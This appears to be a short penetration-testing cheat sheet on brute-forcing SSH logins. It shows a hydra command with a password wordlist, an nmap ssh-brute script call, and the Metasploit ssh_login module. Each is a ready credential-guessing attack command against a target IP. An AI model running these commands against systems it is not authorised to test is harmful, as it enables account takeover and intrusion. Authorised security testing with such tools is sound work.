
### Using `hydra`

```
hydra -l <username> -P <psswd-wrdlst> <target-IP> ssh
```

### Using `nmap`

```
nmap -p 22 <target-ip> --script ssh-brute --script-args userdb=<user-wrdlst>
```
*For `userdb` argument we need to pass a file with username(s)*

### Using `metasploit`

```
use auxiliary/scanner/ssh/ssh_login
```
*Set `STOP_ON_SUCCESS` as true in the options.*
